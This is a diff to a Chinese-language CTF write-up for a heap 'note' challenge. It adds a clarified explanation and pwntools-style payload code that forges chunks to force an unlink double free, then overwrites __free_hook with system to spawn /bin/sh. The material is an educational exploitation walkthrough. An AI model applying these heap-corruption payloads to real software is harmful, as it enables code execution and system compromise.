@@ -68,7 +68,7 @@ free_note只将in_use和len清0，总数减一，但是free的时候没有判断
 1.申请smallbin大小的chunk，然后将其free，使得此chunk的fd和bk填充上unsorted bin的地址<br>
 2.使用edit_note合并第一步free的chunk,然后通过list泄露libc基址，用同样的方法泄露出heap的基址<br>
 3.利用note结构体中指向heap的指针和heap中的chunk构造double free，使得修改了note结构体中data的地址，让data指向了note结构体<br>
-4.edit根据note结构体中的data来写，所以这一步可以对note结构体里面的任意写，这里<br>
+4.edit是根据note->data中的地址写，上一步修改了note->data，note->data指向了note，所以这里可以写note,达成任意地址写<br>
 ```
 note[0]->data=free_hook
 note[1]->data=note[2]->in_use
@@ -114,6 +114,14 @@ success(hex(gbuff))
 然后通过edit中的realloc可以修改chunkb的fd和bk伪造chunk<br>
 chunka+chunkb的这一块大空间伪造了三个chunk<br>
 chunk0(free)+chunk1(将要被free，造成double free)+chunk2(size正常，规避next-size检测机制)<br>
+```
+payload=p64(0)+p64(0x101)+p64(gbuff+0x20-0x18)+p64(gbuff+0x20-0x10)+'A'*0xe0
+payload+=p64(0x100)+p64(0xd0)+p64(0)*2+'B'*0xb0
+payload+=p64(0xc0)+p64(0x41)+p64(gbuff)*2
+
+edit(0,0x1f0,payload)
+delete(1)
+```
 #### Q1:如何double free呢？
 我们可以再图2中note[0]->data找到指向chunk1的指针，如果能使chunk1和note[0]->data形成一个双向链表，就可以通过free(chunk2 or old chunkb),然后就会尝试unlink chunk1，由于chunk1满足unlink的检测条件，所以这里可以unlink成功，并且可以将note[0]->data修改成chunk1的fd<br><br>
 #### Q2:为什么可以free(chunk2 or old chunkb)，chunk2不是已经在new chunka中了吗？
@@ -130,9 +138,24 @@ FD->bk=chunk1->bk,chunkBK->fd=chunk1->fd，所以note[0]->data最终被赋值成
 ![](img/double_free_note.PNG)<br>
 图2：note<br>
 
+#### 4.任意地址写，修改free_hook->system，然后执行system('/bin/sh')<br>
+edit是根据note->data中的地址写，上一步修改了note[0]->data，note[0]->data指向了0x603018，所以这里可以修改所有note的in_use/len/data区域,从而达成任意地址写
 
 
+```
+free_hook=libc_base+libc.symbols['__free_hook']
+payload=p64(2)+p64(1)+p64(0x1f0)+p64(free_hook)+p64(1)+p64(8)+p64(gbuff+0x40)+'/bin/sh\x00'
+payload=payload.ljust(0x1f0,'a')
 
+edit(0,0x1f0,payload)
+
+system=libc_base+libc.symbols['system']
+payload=p64(system)
+edit(0,0x1f0,payload.ljust(0x1f0,'\x00'))
+
+delete(1)
+
+```
 
 
 
